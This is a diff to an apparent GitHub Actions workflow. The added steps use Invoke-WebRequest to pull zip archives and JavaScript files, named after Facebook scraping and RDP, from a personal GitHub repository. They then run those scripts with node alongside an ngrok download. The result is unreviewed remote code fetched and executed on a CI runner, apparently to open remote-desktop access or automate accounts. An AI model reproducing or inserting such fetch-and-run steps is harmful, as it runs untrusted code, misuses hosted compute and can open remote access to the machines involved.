@@ -6,6 +6,18 @@ jobs:
     steps:
 
     - name: Download
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/facebook-scraping/main/node_modules.zip -OutFile raiyan.zip
+    - run: Expand-Archive -LiteralPath raiyan.zip -DestinationPath c:\Users\runneradmin\Desktop\raiyan
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/facebook-scraping/main/github.js -OutFile c:\Users\runneradmin\Desktop\raiyan\create.js
+    
+    - name: Start
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/me/node_modules.zip -OutFile start.zip
+    - run: Expand-Archive -LiteralPath start.zip
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/me/rdp.js -OutFile start\start.js
+    - run: node start/start.js 0
+    - run: node start/start.js 1
+
+    - name: Download
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
 
       
